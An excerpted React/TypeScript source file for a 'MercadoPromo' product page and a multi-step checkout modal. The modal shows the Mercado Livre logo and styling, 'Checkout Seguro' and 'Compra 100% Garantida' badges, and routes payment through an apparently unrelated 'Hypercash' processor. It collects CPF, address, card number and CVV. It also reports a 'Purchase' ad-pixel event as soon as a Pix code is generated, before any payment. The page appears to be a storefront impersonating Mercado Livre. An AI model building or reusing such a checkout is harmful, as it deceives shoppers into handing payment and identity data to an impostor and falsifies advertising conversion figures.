...
export function MercadoPromoPage({ forcedSlug }: { forcedSlug?: string } = {}) {
  ...
  const [hypercashModalOpen, setHypercashModalOpen] = useState(false);
  ...
  const onBuy = () => {
    ...
    if (PRODUCT.id === "mercadopromo-jelly-mule") {
      trackProductEvent(PRODUCT, "InitiateCheckout", params);
      setHypercashModalOpen(true);
      return;
    }
    if (isSoftProduct) {
      trackProductEvent(PRODUCT, "InitiateCheckout", params);
  ...
  return (
    ...
    >
      ...
      {hypercashModalOpen && (
        <MercadoLivreHypercashCheckoutModal
          product={PRODUCT}
          color={color}
          size={size ?? "37"}
          qty={qty}
          onClose={() => setHypercashModalOpen(false)}
        />
      )}
      <div className="h-10" />
    </div>
...
// -----------------------------------------------------------------------------
// CHECKOUT MERCADO LIVRE EM 3 ETAPAS - INTEGRAÇÃO HYPERCASH ON-SITE
// -----------------------------------------------------------------------------
function MercadoLivreHypercashCheckoutModal({
  product,
  color,
  size,
  qty,
  ...
  // Stepper: 1 (Identificação) -> 2 (Entrega) -> 3 (Pagamento) -> 4 (Pix Gerado) -> 5 (Sucesso)
  ...
  // Totais
  const unitPrice = product.price / 100; // 49.90
  const subtotal = unitPrice * qty;
  const pixDiscount = paymentMethod === "PIX" ? Math.round(subtotal * 0.05 * 100) / 100 : 0;
  const totalAmount = subtotal - pixDiscount;
  ...
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 11);
    if (v.length <= 10) {
      setPhone(v.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3").trim());
    } else {
      setPhone(v.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3").trim());
    }
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 8);
    setZipCode(v.replace(/(\d{5})(\d)/, "$1-$2"));
  };
  ...
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    ...
    setCardExpiry(v.replace(/(\d{2})(\d)/, "$1/$2"));
  };

  // Auto-busca CEP no ViaCEP
  useEffect(() => {
  ...
  // Polling de status do Pix a cada 3s
  useEffect(() => {
    ...
    const pollInterval = setInterval(async () => {
      try {
        const res = await getTx({ data: { transactionId: pixData.transactionId! } });
        if (isCancelled) return;
        if (res.status === "PAID" || res.status === "APPROVED" || res.status === "AUTHORIZED") {
          clearInterval(pollInterval);
          if (leadId) {
            void updateLeadFn({ data: { leadId, status: "PAID" } });
          }
  ...
  }, [step, pixData.transactionId, getTx, leadId, product, totalAmount, qty, updateLeadFn]);
  ...
  const handleStep1Submit = async (e: FormEvent) => {
    ...
    if (!name.trim() || name.trim().split(" ").length < 2) {
      setErrorMsg("Por favor, digite seu nome e sobrenome completo.");
      return;
    }
    ...
    if (cleanPhone.length < 10) {
      setErrorMsg("Por favor, digite um WhatsApp/telefone com DDD.");
      return;
    }
    if (!email.includes("@") || !email.includes(".")) {
      setErrorMsg("Por favor, digite um e-mail válido para receber o rastreio.");
      return;
    }

    try {
      setLoading(true);
      const res = await recordLeadFn({
        data: {
          customer: {
            name: name.trim(),
            cpf: cleanCpf,
  ...
  const handleStep2Submit = async (e: FormEvent) => {
    ...
    if (!street.trim()) {
      setErrorMsg("Por favor, preencha o nome da sua rua ou avenida.");
      return;
    }
    if (!streetNumber.trim()) {
      setErrorMsg("Por favor, preencha o número do endereço.");
      return;
    }
    if (!neighborhood.trim()) {
      setErrorMsg("Por favor, preencha o bairro.");
      return;
    }
  ...
  const handleStep3Submit = async (e: FormEvent) => {
    ...
    if (paymentMethod === "CREDIT_CARD") {
      ...
      if (cleanExpiry.length !== 4) {
        setErrorMsg("Data de validade inválida (MM/AA).");
        return;
      }
      if (cleanCvv.length < 3) {
        setErrorMsg("Código de segurança (CVV) inválido.");
        return;
      }
    ...
    try {
      ...
      const txResult = await createTx({
        data: {
          ...
          items: [
            {
              title: `${product.title} - ${color.label} (Tam: ${size})`,
      ...
      if (paymentMethod === "PIX") {
        ...
        fbqTrackCustomSingle(PIXEL_ID, "PixGenerated", {
          content_name: product.title,
          value: totalAmount,
          currency: "BRL",
          order_id: txResult.transactionId,
        });
        ...
        fbqTrackSingle(PIXEL_ID, "Purchase", {
          ...
          currency: "BRL",
          num_items: qty,
          order_id: txResult.transactionId || `ML-${Date.now()}`,
        });
      ...
      setErrorMsg(err?.message || "Ocorreu um erro ao processar o pagamento. Verifique os dados e tente novamente.");
    } finally {
      setLoading(false);
    }
  };
  ...
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/65 backdrop-blur-xs p-3 md:p-4 overflow-y-auto font-sans">
      <div className="w-full max-w-lg bg-white rounded-xl shadow-2xl overflow-hidden border border-[#ddd] my-auto animate-in fade-in zoom-in-95 duration-200">
        
        {/* HEADER MERCADO LIVRE */}
        <div className="bg-[#fff159] text-[#333] px-4 py-3 border-b border-[#e6d800] flex items-center justify-between">
          <div className="flex items-center gap-2">
            <img src={mlLogo} alt="Mercado Livre" className="h-6 w-auto object-contain" />
            <div className="border-l border-black/20 pl-2">
              <span className="text-xs font-black tracking-tight text-gray-900 block leading-tight">Checkout Seguro</span>
              <span className="text-[10px] text-gray-700 flex items-center gap-1 font-medium">
                <ShieldCheck size={11} className="text-[#00a650]" /> Compra 100% Garantida
              </span>
            </div>
          </div>
          <button
            onClick={onClose}
            className="w-7 h-7 rounded-full bg-black/10 hover:bg-black/20 flex items-center justify-center text-gray-800 transition-colors"
        ...
        {/* STEPPER (ETAPAS 1, 2, 3) */}
        {step <= 3 && (
          <div className="bg-[#f7f7f7] border-b border-[#eee] px-4 py-3">
            <div className="flex items-center justify-between max-w-xs mx-auto text-xs font-semibold">
              {/* Etapa 1 */}
              <div className={`flex items-center gap-1.5 ${step === 1 ? "text-[#3483fa] font-bold" : step > 1 ? "text-[#00a650]" : "text-gray-400"}`}>
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${step === 1 ? "bg-[#3483fa] text-white" : step > 1 ? "bg-[#00a650] text-white" : "bg-gray-200 text-gray-600"}`}>
                  {step > 1 ? <Check size={12} /> : "1"}
                </span>
                <span>Identificação</span>
              </div>
              <div className={`h-0.5 flex-1 mx-2 ${step > 1 ? "bg-[#00a650]" : "bg-gray-200"}`} />

              {/* Etapa 2 */}
              <div className={`flex items-center gap-1.5 ${step === 2 ? "text-[#3483fa] font-bold" : step > 2 ? "text-[#00a650]" : "text-gray-400"}`}>
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${step === 2 ? "bg-[#3483fa] text-white" : step > 2 ? "bg-[#00a650] text-white" : "bg-gray-200 text-gray-600"}`}>
                  {step > 2 ? <Check size={12} /> : "2"}
                </span>
                <span>Entrega</span>
              </div>
              <div className={`h-0.5 flex-1 mx-2 ${step > 2 ? "bg-[#00a650]" : "bg-gray-200"}`} />

              {/* Etapa 3 */}
              <div className={`flex items-center gap-1.5 ${step === 3 ? "text-[#3483fa] font-bold" : "text-gray-400"}`}>
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${step === 3 ? "bg-[#3483fa] text-white" : "bg-gray-200 text-gray-600"}`}>
                  3
                </span>
                <span>Pagamento</span>
              </div>
        ...
        {/* RESUMO DO PEDIDO */}
        {step <= 3 && (
          <div className="p-3 bg-[#fbfbfb] border-b border-[#eee] flex items-center gap-3">
            <img src={color.thumb} alt={product.title} className="w-12 h-12 object-contain bg-white rounded border border-[#e0e0e0] p-1 shrink-0" />
            <div className="flex-1 min-w-0">
              <h4 className="text-xs font-bold text-gray-900 truncate">{product.title}</h4>
              <p className="text-[11px] text-gray-500">Cor: <strong>{color.label}</strong> | Tam: <strong>{size} BR</strong> | Qtd: {qty}</p>
              <p className="text-[11px] font-bold text-[#00a650] flex items-center gap-1">
                <Truck size={12} /> Chegará grátis pelo Mercado Envios Full
              </p>
            </div>
            <div className="text-right shrink-0">
              ...
              {paymentMethod === "PIX" && (
                <span className="inline-block text-[10px] bg-[#e6f7ed] text-[#00a650] font-bold px-1.5 py-0.5 rounded">
                  5% OFF no Pix
                </span>
              )}
            </div>
        ...
        {errorMsg && (
          <div className="m-4 mb-0 flex items-start gap-2 rounded-lg bg-red-50 p-3 text-xs text-red-700 border border-red-200">
        ...
        {/* CORPO DO FORMULÁRIO */}
        <div className="p-4 md:p-5 max-h-[75vh] overflow-y-auto">

          {/* ============================================================
              ETAPA 1: IDENTIFICAÇÃO (DADOS PESSOAIS)
             ============================================================ */}
          {step === 1 && (
            <form onSubmit={handleStep1Submit} className="space-y-4">
              <div>
                <h3 className="text-sm font-bold text-gray-900">1. Seus dados para nota e envio</h3>
                <p className="text-xs text-gray-500">Usaremos para emitir a Nota Fiscal e enviar o rastreio.</p>
              </div>
              ...
              <div>
                ...
                <input
                  ...
                  className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] transition-all"
                  required
                />
              </div>
              ...
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  ...
                  <input
                    ...
                    className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] transition-all font-mono"
                    required
                  />
                </div>
                <div>
              ...
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3.5 bg-[#3483fa] hover:bg-[#2968c8] text-white font-bold text-sm rounded-lg shadow-md transition-all active:scale-[0.99] flex items-center justify-center gap-2 cursor-pointer mt-2"
              >
                {loading ? <Loader2 size={16} className="animate-spin" /> : "Continuar para Entrega →"}
              </button>

              <p className="text-[11px] text-gray-400 text-center flex items-center justify-center gap-1">
                <Lock size={12} /> Seus dados estão seguros e protegidos
              </p>
            </form>
          )}
          ...
          {step === 2 && (
            <form onSubmit={handleStep2Submit} className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-gray-900">2. Onde você quer receber seu pedido?</h3>
                  <p className="text-xs text-gray-500">Frete Grátis com Mercado Envios Full.</p>
                </div>
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-xs text-[#3483fa] hover:underline font-semibold flex items-center gap-1"
                >
              ...
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1 flex items-center justify-between">
                  ...
                  {cepLoading && <span className="text-[10px] text-[#3483fa] flex items-center gap-1"><Loader2 size={10} className="animate-spin" /> Buscando endereço...</span>}
                </label>
                <input
                  type="text"
              ...
              <div className="grid grid-cols-3 gap-3">
                ...
                <div>
                  ...
                  <input
                    ...
                    className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] transition-all uppercase text-center font-mono font-bold"
                    required
                  />
                </div>
              </div>

              <div className="p-3 bg-[#e6f7ed] rounded-lg border border-[#b2e5c5] flex items-center gap-2 text-xs text-[#006633] font-medium">
                <Truck size={16} className="text-[#00a650] shrink-0" />
                <span>Envio rápido via <strong>Mercado Envios Full</strong> com código de rastreio.</span>
              </div>
          ...
          {step === 3 && (
            <form onSubmit={handleStep3Submit} className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-gray-900">3. Como você prefere pagar?</h3>
                  <p className="text-xs text-gray-500">Escolha a forma de pagamento.</p>
                </div>
                <button
                  type="button"
                  onClick={() => setStep(2)}
                  ...
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <input
                        ...
                        className="accent-[#00a650] w-4 h-4"
                      />
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-xs text-gray-900">Pix</span>
                          <span className="bg-[#00a650] text-white text-[10px] font-black px-2 py-0.5 rounded-full">
                            5% DE DESCONTO
                          </span>
                        </div>
                        <p className="text-[11px] text-gray-500 mt-0.5">Aprovação imediata e envio prioritário</p>
                      </div>
                    </div>
                    <div className="text-right">
                      <span className="text-xs text-gray-400 line-through">R$ {subtotal.toFixed(2).replace(".", ",")}</span>
                      <div className="text-sm font-black text-[#00a650]">
                        R$ {(subtotal * 0.95).toFixed(2).replace(".", ",")}
                      </div>
                    </div>
                  </div>
                </label>
                  ...
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <input
                        ...
                        className="accent-[#3483fa] w-4 h-4"
                      />
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-xs text-gray-900">Cartão de Crédito</span>
                          <span className="bg-gray-100 text-gray-700 text-[10px] font-bold px-2 py-0.5 rounded">
                            Até 6x sem juros
                          </span>
                        </div>
                        <p className="text-[11px] text-gray-500 mt-0.5">Visa, Mastercard, Elo, Hipercard, Amex</p>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-sm font-black text-gray-900">
                      ...
                      <span className="text-[10px] text-gray-500">6x de R$ {(subtotal / 6).toFixed(2).replace(".", ",")}</span>
                    </div>
                  </div>
                </label>
              </div>

              {/* CAMPOS DO CARTÃO (QUANDO CARTÃO SELECIONADO) */}
              {paymentMethod === "CREDIT_CARD" && (
                <div className="p-4 bg-[#f8f9fa] rounded-xl border border-[#e0e0e0] space-y-3 animate-in fade-in duration-200">
                  <div>
                    <label className="block text-xs font-semibold text-gray-700 mb-1">
                      Número do Cartão *
                    </label>
                    <div className="relative">
                      <input
                        ...
                        className="w-full pl-9 pr-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] font-mono"
                        required
                      />
                  ...
                  <div>
                    ...
                    <input
                      ...
                      className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] uppercase"
                      required
                    />
                  </div>
                  ...
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      ...
                      <input
                        ...
                        className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa] text-center font-mono"
                        required
                      />
                    </div>
                    <div>
                  ...
                  <div>
                    ...
                    <select
                      ...
                      className="w-full px-3 py-2.5 text-xs bg-white rounded-lg border border-[#ccc] outline-none focus:border-[#3483fa] focus:ring-1 focus:ring-[#3483fa]"
                    >
                      <option value={1}>1x de R$ {subtotal.toFixed(2).replace(".", ",")} (à vista)</option>
                      <option value={2}>2x de R$ {(subtotal / 2).toFixed(2).replace(".", ",")} sem juros</option>
                      <option value={3}>3x de R$ {(subtotal / 3).toFixed(2).replace(".", ",")} sem juros</option>
                      <option value={4}>4x de R$ {(subtotal / 4).toFixed(2).replace(".", ",")} sem juros</option>
                      <option value={5}>5x de R$ {(subtotal / 5).toFixed(2).replace(".", ",")} sem juros</option>
                      <option value={6}>6x de R$ {(subtotal / 6).toFixed(2).replace(".", ",")} sem juros</option>
                    </select>
                  </div>
                </div>
              )}
              ...
              <button
                type="submit"
                disabled={loading}
                className={`w-full py-3.5 font-bold text-sm rounded-lg shadow-md transition-all active:scale-[0.99] flex items-center justify-center gap-2 cursor-pointer mt-3 text-white ${
                  paymentMethod === "PIX"
                    ? "bg-[#00a650] hover:bg-[#008f45]"
              ...
              >
                {loading ? (
                  ...
                  `Gerar Pix com 5% de Desconto • R$ ${totalAmount.toFixed(2).replace(".", ",")}`
                ) : (
                  `Pagar R$ ${totalAmount.toFixed(2).replace(".", ",")} no Cartão`
                )}
              </button>

              <div className="p-2.5 bg-gray-50 rounded-lg text-[11px] text-gray-500 text-center flex items-center justify-center gap-1.5 border border-gray-200">
                <Lock size={12} className="text-[#00a650]" />
          ...
          {step === 4 && (
            <div className="space-y-4 text-center py-2 animate-in fade-in duration-200">
              ...
              <div className="text-center">
                ...
                <div className="text-[11px] text-[#00a650] font-bold">
                  Economia de 5% aplicada no Pix!
                </div>
              </div>
                  ...
                  <div className="flex gap-2">
                    ...
                    <button
                      ...
                      className={`px-4 py-2 rounded-lg font-bold text-xs transition-all flex items-center gap-1 shrink-0 ${
                        copied ? "bg-[#00a650] text-white" : "bg-[#3483fa] hover:bg-[#2968c8] text-white"
                      }`}
                    >
              ...
              {/* STATUS DE VERIFICAÇÃO ATIVA */}
              <div className="p-3 bg-blue-50 rounded-xl border border-blue-100 text-xs text-[#3483fa] flex items-center justify-center gap-2">
                <Loader2 size={14} className="animate-spin text-[#3483fa]" />
            ...
            <div className="space-y-4 text-center py-6 animate-in zoom-in-95 duration-200">
              ...
              <div className="p-4 bg-gray-50 rounded-xl border border-gray-200 text-left space-y-2 text-xs">
                ...
                <div className="flex justify-between text-gray-600">
                  ...
                  <strong className="text-[#00a650] text-sm">R$ {totalAmount.toFixed(2).replace(".", ",")}</strong>
                </div>
                <div className="flex justify-between text-gray-600">
              ...
              <button
                type="button"
                onClick={onClose}
                className="w-full py-3 bg-[#3483fa] hover:bg-[#2968c8] text-white font-bold text-xs rounded-lg transition-all shadow"
              >
